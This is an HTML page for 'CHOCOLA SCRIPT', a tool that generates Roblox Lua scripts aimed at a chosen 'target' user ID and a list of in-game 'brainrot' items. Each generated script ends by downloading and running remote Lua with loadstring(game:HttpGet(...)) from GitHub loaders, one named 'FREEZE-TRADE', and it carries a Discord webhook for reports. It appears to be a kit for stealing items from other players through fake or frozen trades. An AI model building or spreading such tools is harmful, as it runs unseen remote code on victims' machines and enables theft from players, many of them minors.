<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHOCOLA SCRIPT — Script Generator</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#070608;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh}
        .bg{position:fixed;inset:0;background:radial-gradient(ellipse at 50% 30%,#1a1a2e,#0a0a0f);z-index:0}
        .wrap{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;padding:2rem}
        .card{background:rgba(20,18,30,.95);border-radius:24px;padding:1.5rem;max-width:700px;width:100%;border:1px solid rgba(139,92,246,.2)}
        .discord-link{display:inline-flex;align-items:center;gap:8px;background:#5865F2;color:white;padding:8px 16px;border-radius:100px;text-decoration:none;font-size:13px;margin-top:10px;transition:all .2s}
        .discord-link:hover{background:#4752c4;transform:scale(1.02)}
        .header{text-align:center;margin-bottom:1.5rem}
        .header h1{font-size:2.5rem;background:linear-gradient(135deg,#f97316,#fb923c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#888;font-size:13px}
        .badges{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-bottom:1.5rem}
        .badge{background:rgba(139,92,246,.1);border:1px solid rgba(139,92,246,.2);padding:4px 12px;border-radius:20px;font-size:11px}
        .field{margin-bottom:1rem}
        .lbl{font-size:10px;text-transform:uppercase;color:#aaa;margin-bottom:5px;display:block;letter-spacing:1px}
        .inp{width:100%;padding:12px;background:#0a0a0f;border:1px solid #333;border-radius:12px;color:#fff;outline:none}
        .inp:focus{border-color:#8b5cf6}
        .inp::placeholder{color:#444}
        .mode-tabs{display:flex;gap:8px;margin-bottom:16px;margin-top:8px}
        .mode-btn{flex:1;padding:10px;background:#0a0a0f;border:1px solid #333;border-radius:12px;color:#aaa;cursor:pointer;text-align:center;font-size:13px}
        .mode-btn.active{background:#8b5cf6;border-color:#8b5cf6;color:#fff}
        .custom-area{display:none;margin-top:10px}
        .br-select-btn{width:100%;padding:12px;background:#0a0a0f;border:1px solid #333;border-radius:12px;display:flex;justify-content:space-between;cursor:pointer;color:#aaa}
        .position-relative{position:relative}
        .dd{position:absolute;top:100%;left:0;right:0;margin-top:5px;background:#1a1a2e;border:1px solid #333;border-radius:12px;max-height:500px;overflow-y:auto;display:none;z-index:100}
        .dd.open{display:block}
        .cat-tabs{display:flex;gap:8px;padding:10px;border-bottom:1px solid #333;flex-wrap:wrap}
        .cat-btn{padding:6px 12px;background:#0a0a0f;border:1px solid #333;border-radius:20px;cursor:pointer;font-size:12px;color:#aaa}
        .cat-btn.active{background:#8b5cf6;border-color:#8b5cf6;color:#fff}
        .dd-search{padding:10px;border-bottom:1px solid #333}
        .dd-search input{width:100%;padding:8px;background:#0a0a0f;border:1px solid #333;border-radius:8px;color:#fff}
        .br-list{max-height:300px;overflow-y:auto}
        .br-item{padding:8px 12px;cursor:pointer;display:flex;align-items:center;gap:10px}
        .br-item:hover{background:#2a2a3e}
        .br-item.sel{background:#8b5cf620}
        .br-chk{width:18px;height:18px;border:1px solid #555;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:11px}
        .br-item.sel .br-chk{background:#8b5cf6;border-color:#8b5cf6}
        .br-name{flex:1;font-size:12px}
        .br-rarity{font-size:9px;padding:2px 6px;border-radius:4px}
        .rarity-OG{color:#ff9d00}
        .rarity-Secret{color:#e040fb}
        .dd-footer{padding:10px;border-top:1px solid #333;display:flex;gap:10px}
        .dd-footer button{flex:1;padding:8px;background:#2a2a3e;border:none;border-radius:8px;color:#fff;cursor:pointer}
        .tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px;max-height:100px;overflow-y:auto}
        .tag{background:#8b5cf620;padding:4px 10px;border-radius:20px;font-size:11px;display:inline-flex;align-items:center;gap:5px}
        .tag button{background:none;border:none;color:#aaa;cursor:pointer}
        .gen-btn{width:100%;padding:14px;border-radius:12px;border:none;font-size:14px;font-weight:bold;cursor:pointer;margin-top:1rem;transition:all .2s;background:linear-gradient(135deg,#8b5cf6,#6d28d9);color:#fff}
        .gen-btn.disabled{background:#2a2a3e;color:#555;cursor:not-allowed}
        .result{margin-top:1.5rem;display:none}
        .result.show{display:block}
        .result-header{display:flex;justify-content:space-between;margin-bottom:10px}
        .copy-btn{padding:6px 12px;background:#2a2a3e;border:none;border-radius:8px;color:#fff;cursor:pointer}
        .script-box{background:#0a0a0f;border:1px solid #333;border-radius:12px;padding:1rem;font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:350px;overflow:auto}
        .toast{position:fixed;bottom:20px;right:20px;background:#8b5cf6;padding:10px 20px;border-radius:10px;animation:slideIn .3s;z-index:1000}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        .footer{text-align:center;margin-top:1.5rem;color:#555;font-size:11px}
        .footer a{color:#8b5cf6;text-decoration:none}
    </style>
</head>
<body>
<div class="bg"></div>
<div class="wrap">
    <div class="card">
        <div class="header">
            <h1>⚡ CHOCOLA SCRIPT</h1>
            <p>Automated script generation for your Roblox targets</p>
            <a href="https://discord.gg/74GMyygaMy" target="_blank" class="discord-link">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .381-.303.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.381.303a.077.077 0 0 1-.006.128 12.46 12.46 0 0 1-1.873.892.077.077 0 0 0-.041.106c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
                Join our Discord
            </a>
        </div>
        <div class="badges">
            <div class="badge">⚡ Instant generation</div>
            <div class="badge">🔒 Secure webhook</div>
            <div class="badge">🎯 Precise target selection</div>
        </div>

        <div class="field">
            <label class="lbl">📡 WEBHOOK</label>
            <input class="inp" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
        </div>

        <div class="field">
            <label class="lbl">🎯 TARGET ID</label>
            <input class="inp" id="targetId" placeholder="Ej: 10507250599">
        </div>

        <div class="field">
            <label class="lbl">SCRIPT MODE</label>
            <div class="mode-tabs">
                <button class="mode-btn active" data-mode="NO-GUI">NO-GUI</button>
                <button class="mode-btn" data-mode="FREEZE">FREEZE</button>
                <button class="mode-btn" data-mode="CUSTOM">CUSTOM</button>
            </div>
            <div class="custom-area" id="customArea">
                <input class="inp" id="customLoader" placeholder="loadstring(game:HttpGet('https://tu-ui.com/ui.lua'))()">
                <small style="color:#555; font-size:10px; display:block; margin-top:5px;">Pega tu loadstring de UI (solo para modo CUSTOM)</small>
            </div>
        </div>

        <div class="field">
            <label class="lbl">🎨 TARGET BRAINROTS</label>
            <div class="position-relative">
                <button class="br-select-btn" id="brToggle">
                    <span id="brCount">Selecciona brainrots...</span>
                    <span>▼</span>
                </button>
                <div class="dd" id="brDropdown">
                    <div class="cat-tabs">
                        <button class="cat-btn active" data-cat="all">Todos</button>
                        <button class="cat-btn" data-cat="OG">OG 🔥</button>
                        <button class="cat-btn" data-cat="Secret">Secret ✨</button>
                    </div>
                    <div class="dd-search">
                        <input type="text" id="brSearch" placeholder="Buscar brainrot...">
                    </div>
                    <div class="br-list" id="brList"></div>
                    <div class="dd-footer">
                        <button id="selectAllBtn">Seleccionar Todos</button>
                        <button id="deselectAllBtn">Deseleccionar</button>
                        <button id="doneBtn">Cerrar</button>
                    </div>
                </div>
            </div>
            <div class="tags" id="brTags"></div>
        </div>

        <button class="gen-btn disabled" id="generateBtn" disabled>⚠️ SELECCIONA BRAINROTS PRIMERO</button>

        <div class="result" id="result">
            <div class="result-header">
                <span>📜 Script generado (copia y pega)</span>
                <button class="copy-btn" id="copyBtn">Copiar</button>
            </div>
            <pre class="script-box" id="scriptOutput"></pre>
        </div>
        <div class="footer"><a href="https://discord.gg/74GMyygaMy" target="_blank">Join our Discord</a> for support and updates</div>
    </div>
</div>

<script>
    // ========== BRAINROTS OG ==========
    const OG_BRAINROTS = [
        "Meowl", "Headless Horseman", "Skibidi Toilet", "Strawberry Elephant",
        "Griffin", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Dragon Cannelloni",
        "Love Love Bear", "La Supreme Combinasion", "Hydra Bunny", "Ketupat Bros",
        "Ginger Gerat", "Cerberus", "Signore Carapace", "Antonio", "Elefanto Frigo"
    ];

    // ========== BRAINROTS SECRET ==========
    const SECRET_BRAINROTS = [
        "Mi Gatito", "Cupid Hotspot", "Ho Ho Ho Sahur", "Cupid Cupid Sahur",
        "Pot Pumpkin", "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila",
        "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira",
        "To to to Sahur", "Telemorte", "La Sahur Combinasion", "List List List Sahur",
        "Noo my examine", "Los Jobcitos", "Cuadramat and Pakrahmatmamat", "Bunnyman",
        "Nooo My Hotspot", "Tung Tung Tung Sahur", "Please my Present", "Los Cucarachas",
        "1x1x1x1", "Celestial Pegasus", "Bunny and Eggy", "Popcuru and Fizzuru",
        "Rosey and Teddy", "Capitano Moby", "Cooki and Milki", "Burguro And Fryuro",
        "Arcadragon", "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion",
        "Pancake and Syrup", "Foxini Lanternini", "Los Sekolahs", "Cash or Card",
        "Fragrama and Chocrama", "La Food Combinasion", "La Ginger Sekolah", "Sammyni Fattini",
        "Los Spaghettis", "Festive 67", "Ventoliero Pavonero", "Cloverat Clapat",
        "Spaghetti Tualetti", "La Easter Grande", "Nacho Spyder", "Rosetti Tualetti",
        "Fishino Clownino", "Garama and Madundung", "Gold Gold Gold", "Jolly Jolly Sahur",
        "Lavadorito Spinito", "Ketchuru and Musturu", "Rico Dinero", "Tirilikalika Tirilikalako",
        "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur", "La Taco Combinasion",
        "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang", "Los Tacoritas", "Lovin Rose",
        "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande", "Los Mariachis",
        "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan",
        "Mieteteira Bicicleteira", "Chipso and Queso", "Money Money Reindeer", "Chillin Chili",
        "La Spooky Grande", "Bacuru and Egguru", "Los Bros", "La Extinct Grande", "Los Candies",
        "Los 67", "Celularcini Viciosini", "Los Mobilis", "Money Money Puggy", "Cigno Fulgoro"
    ];

    const ALL_BRAINROTS = [...OG_BRAINROTS, ...SECRET_BRAINROTS];
    let selectedBrainrots = new Set();
    let currentCategory = "all";
    let searchTerm = "";
    let scriptMode = "NO-GUI";

    const MAIN_LOADER = "https://raw.githubusercontent.com/chocolascript-glitch/luarmor.net/refs/heads/main/api/loadstring/fb14c57cabe9536a3bac0c101cf7abc7.lua";
    const FREEZE_LOADER = "https://raw.githubusercontent.com/chocolascript-glitch/FREEZE-TRADE/refs/heads/main/ui.lua";

    function updateButtonState() {
        const targetId = document.getElementById('targetId').value.trim();
        const btn = document.getElementById('generateBtn');
        
        if (selectedBrainrots.size === 0) {
            btn.disabled = true;
            btn.classList.add('disabled');
            btn.innerHTML = '⚠️ SELECCIONA BRAINROTS PRIMERO';
        } else if (!targetId) {
            btn.disabled = true;
            btn.classList.add('disabled');
            btn.innerHTML = '⚠️ INGRESA UN TARGET ID';
        } else {
            btn.disabled = false;
            btn.classList.remove('disabled');
            btn.innerHTML = '✨ GENERAR SCRIPT';
        }
    }

    function renderBrainrotList() {
        let filtered = ALL_BRAINROTS;
        if (currentCategory === "OG") filtered = OG_BRAINROTS;
        else if (currentCategory === "Secret") filtered = SECRET_BRAINROTS;
        if (searchTerm) filtered = filtered.filter(b => b.toLowerCase().includes(searchTerm));
        
        const container = document.getElementById('brList');
        container.innerHTML = filtered.map(b => {
            const isOG = OG_BRAINROTS.includes(b);
            return `<div class="br-item ${selectedBrainrots.has(b) ? 'sel' : ''}" data-name="${b}">
                        <div class="br-chk">${selectedBrainrots.has(b) ? '✓' : ''}</div>
                        <div class="br-name">${b}</div>
                        <div class="br-rarity rarity-${isOG ? 'OG' : 'Secret'}">${isOG ? 'OG' : 'Secret'}</div>
                    </div>`;
        }).join('');
        
        document.querySelectorAll('.br-item').forEach(item => {
            item.addEventListener('click', (e) => {
                e.stopPropagation();
                const name = item.dataset.name;
                if (selectedBrainrots.has(name)) selectedBrainrots.delete(name);
                else selectedBrainrots.add(name);
                renderBrainrotList();
                renderTags();
                updateButtonState();
            });
        });
    }

    function renderTags() {
        const arr = Array.from(selectedBrainrots);
        document.getElementById('brCount').textContent = arr.length > 0 ? `${arr.length} seleccionados` : "Selecciona brainrots...";
        const container = document.getElementById('brTags');
        container.innerHTML = arr.map(name => `<span class="tag">${name.length > 25 ? name.substring(0, 22) + '...' : name}<button data-rm="${name}">×</button></span>`).join('');
        document.querySelectorAll('.tag button').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                selectedBrainrots.delete(btn.dataset.rm);
                renderTags();
                renderBrainrotList();
                updateButtonState();
            });
        });
    }

    document.getElementById('targetId').addEventListener('input', () => updateButtonState());

    document.querySelectorAll('.cat-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            currentCategory = btn.dataset.cat;
            renderBrainrotList();
        });
    });

    document.getElementById('brSearch').addEventListener('input', (e) => {
        searchTerm = e.target.value.toLowerCase();
        renderBrainrotList();
    });

    const brToggle = document.getElementById('brToggle');
    const brDropdown = document.getElementById('brDropdown');
    brToggle.addEventListener('click', () => brDropdown.classList.toggle('open'));
    document.getElementById('doneBtn').addEventListener('click', () => brDropdown.classList.remove('open'));
    document.getElementById('selectAllBtn').addEventListener('click', () => {
        let list = ALL_BRAINROTS;
        if (currentCategory === "OG") list = OG_BRAINROTS;
        else if (currentCategory === "Secret") list = SECRET_BRAINROTS;
        if (searchTerm) list = list.filter(b => b.toLowerCase().includes(searchTerm));
        list.forEach(b => selectedBrainrots.add(b));
        renderBrainrotList();
        renderTags();
        updateButtonState();
    });
    document.getElementById('deselectAllBtn').addEventListener('click', () => {
        let list = ALL_BRAINROTS;
        if (currentCategory === "OG") list = OG_BRAINROTS;
        else if (currentCategory === "Secret") list = SECRET_BRAINROTS;
        if (searchTerm) list = list.filter(b => b.toLowerCase().includes(searchTerm));
        list.forEach(b => selectedBrainrots.delete(b));
        renderBrainrotList();
        renderTags();
        updateButtonState();
    });
    document.addEventListener('click', (e) => {
        if (!e.target.closest('#brToggle') && !e.target.closest('#brDropdown')) {
            brDropdown.classList.remove('open');
        }
    });

    const modeBtns = document.querySelectorAll('.mode-btn');
    const customArea = document.getElementById('customArea');
    modeBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            modeBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            scriptMode = btn.dataset.mode;
            customArea.style.display = scriptMode === 'CUSTOM' ? 'block' : 'none';
        });
    });

    const DELAY_STEP = 1;
    const TRADE_CYCLE_DELAY = 2;

    function generateScript() {
        const webhookUrl = document.getElementById('webhookUrl').value.trim();
        const targetId = document.getElementById('targetId').value.trim();
        const customLoader = document.getElementById('customLoader').value.trim();

        if (!targetId) { showToast("❌ Ingresa tu Roblox ID"); return; }
        if (selectedBrainrots.size === 0) { showToast("⚠️ Selecciona al menos un brainrot"); return; }

        let targetBrainrotsStr = "";
        for (const name of selectedBrainrots) {
            // TODOS con corchetes, como pediste
            targetBrainrotsStr += `    ["${name}"] = true,\n`;
        }

        let script = `getgenv().WEBHOOK = "${webhookUrl}"
getgenv().TARGET_ID = ${targetId}
getgenv().DELAY_STEP = ${DELAY_STEP}
getgenv().TRADE_CYCLE_DELAY = ${TRADE_CYCLE_DELAY}
getgenv().TARGET_BRAINROTS = {
${targetBrainrotsStr}}`;

        if (scriptMode === "CUSTOM" && customLoader) {
            script += `\n${customLoader}`;
        } else if (scriptMode === "FREEZE") {
            script += `\nloadstring(game:HttpGet("${FREEZE_LOADER}"))()`;
        }
        
        script += `\nloadstring(game:HttpGet("${MAIN_LOADER}"))()`;

        document.getElementById('scriptOutput').textContent = script;
        document.getElementById('result').classList.add('show');
        showToast("✅ Script generado correctamente");
    }

    function showToast(msg) {
        const existing = document.querySelector('.toast');
        if (existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    document.getElementById('generateBtn').addEventListener('click', generateScript);
    document.getElementById('copyBtn').addEventListener('click', () => {
        const script = document.getElementById('scriptOutput').textContent;
        navigator.clipboard.writeText(script);
        showToast("📋 Copiado al portapapeles");
    });

    renderTags();
    renderBrainrotList();
    updateButtonState();
</script>
</body>
</html>
